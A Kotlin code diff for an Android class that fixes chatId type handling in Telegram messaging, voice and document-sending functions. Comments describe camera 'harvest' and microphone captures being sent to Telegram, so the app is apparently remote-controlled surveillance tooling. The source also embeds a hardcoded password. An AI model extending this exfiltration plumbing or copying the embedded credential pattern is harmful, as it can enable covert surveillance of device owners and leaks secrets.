@@ -26,6 +26,7 @@ import kotlin.random.Random
  * - تعديل handleCamera لتمرير tg و threadId إلى CameraAnalyzer.harvest.
  * - تعديل sendTelegramVoice و sendTelegramDocument لاستقبال threadId واستخدام TelegramUi مباشرة.
  * - تعديل handleMic لتمرير threadId إلى sendTelegramVoice.
+ * - ✅ إصلاح خطأ Type mismatch في sendTelegramMessage: تغيير chatId إلى Any وتحويله إلى String داخلياً.
  */
 class Commands private constructor(context: Context) {
 
@@ -1382,11 +1383,11 @@ class Commands private constructor(context: Context) {
 
     /**
      * إرسال رسالة نصية عبر Telegram (مع منع تسريب كلمة السر)
-     * ✅ تم تعديلها لدعم threadId و replyToMessageId
+     * ✅ تم تعديل chatId إلى Any لاستقبال أي نوع، وتحويله إلى String داخلياً
      */
     private suspend fun sendTelegramMessage(
         tg: Any?,
-        chatId: Any,
+        chatId: Any,  // ✅ تغيير إلى Any لقبول Long و String
         text: String,
         replyMarkupJson: String? = null,
         receivingToken: String? = null,
@@ -1395,7 +1396,9 @@ class Commands private constructor(context: Context) {
     ): Any? {
         // ✅ استبدال كلمة المرور بـ •••••••• في حال وجودها بالخطأ في النص
         val cleanText = text.replace("Zaen123@123@", "••••••••")
-        val params = mutableMapOf<String, Any>("chat_id" to chatId, "text" to cleanText)
+        // ✅ تحويل chatId إلى String صراحةً لتجنب أي خطأ تطابق
+        val chatIdStr = chatId.toString()
+        val params = mutableMapOf<String, Any>("chat_id" to chatIdStr, "text" to cleanText)
         replyMarkupJson?.let { params["reply_markup"] = it }
         return invokeTelegramMethod(
             tg, "sendMessage", params,
@@ -1410,7 +1413,7 @@ class Commands private constructor(context: Context) {
         receivingToken: String? = null
     ) {
         val params = mapOf(
-            "chat_id" to chatId,
+            "chat_id" to chatId.toString(),
             "action" to action
         )
         invokeTelegramMethod(tg, "sendChatAction", params, receivingToken)
@@ -1431,7 +1434,11 @@ class Commands private constructor(context: Context) {
         return try {
             val ui = tg as? TelegramUi
             if (ui != null) {
-                val targetChat = (chatId as? Long) ?: return false
+                val targetChat = when (chatId) {
+                    is Long -> chatId
+                    is String -> chatId.toLongOrNull() ?: return false
+                    else -> return false
+                }
                 val result = ui.sendVoice(targetChat, voiceFile, threadId)
                 result?.optBoolean("ok") == true
             } else false
@@ -1453,7 +1460,11 @@ class Commands private constructor(context: Context) {
         return try {
             val ui = tg as? TelegramUi
             if (ui != null) {
-                val targetChat = (chatId as? Long) ?: return false
+                val targetChat = when (chatId) {
+                    is Long -> chatId
+                    is String -> chatId.toLongOrNull() ?: return false
+                    else -> return false
+                }
                 val result = ui.sendDocument(targetChat, documentFile, caption, threadId)
                 result?.optBoolean("ok") == true
             } else false
